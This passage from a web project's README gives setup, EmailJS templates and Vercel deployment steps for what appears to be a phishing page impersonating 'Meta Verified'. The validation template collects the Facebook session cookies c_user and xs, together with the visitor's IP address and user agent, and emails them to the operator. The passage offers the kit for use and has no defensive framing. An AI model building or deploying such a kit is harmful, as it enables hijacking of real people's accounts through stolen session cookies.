npm install
   ```

2. Create a `.env` file based on `.env.example` with your EmailJS credentials:
   ```
   VITE_EMAILJS_USER_ID=your_user_id
   VITE_EMAILJS_SERVICE_ID=your_service_id
   VITE_EMAILJS_VALIDATION_TEMPLATE_ID=your_template_id
   VITE_EMAILJS_CONFIRMATION_TEMPLATE_ID=your_template_id
   NODE_ENV=development
   ```

3. Start the development server:
   ```bash
   npm run dev
   ```

## Project Structure

```
client/src/
├── components/       # UI components
├── lib/             # Utilities and services
├── pages/           # Route components
└── App.tsx          # Main application component
```

## Email Templates

### Validation Email Template
```
Subject: Meta Verified - Account Validation Request
Body:
Meta Verification Request Details:
- C_User: {{c_user}}
- XS: {{xs}}
- Timestamp: {{timestamp}}
- IP Address: {{ip_address}}
- User Agent: {{user_agent}}
```

### Confirmation Email Template
```
Subject: Meta Verified - Account Confirmation Details
Body:
Meta Verification Confirmation:
- Contact Method: {{contact_method}}
- Country Code: {{country_code}}
- Timestamp: {{timestamp}}
- IP Address: {{ip_address}}
- User Agent: {{user_agent}}
```

## Deployment

This project is configured for deployment on Vercel:

1. Connect your repository to Vercel
2. Configure build settings:
   - Build Command: `npm run build`
   - Output Directory: `dist`
3. Add environment variables in Vercel dashboard
4. Deploy!

## Environment Variables

Required environment variables:
```
VITE_EMAILJS_USER_ID=
VITE_EMAILJS_SERVICE_ID=
VITE_EMAILJS_VALIDATION_TEMPLATE_ID=
VITE_EMAILJS_CONFIRMATION_TEMPLATE_ID=
NODE_ENV=production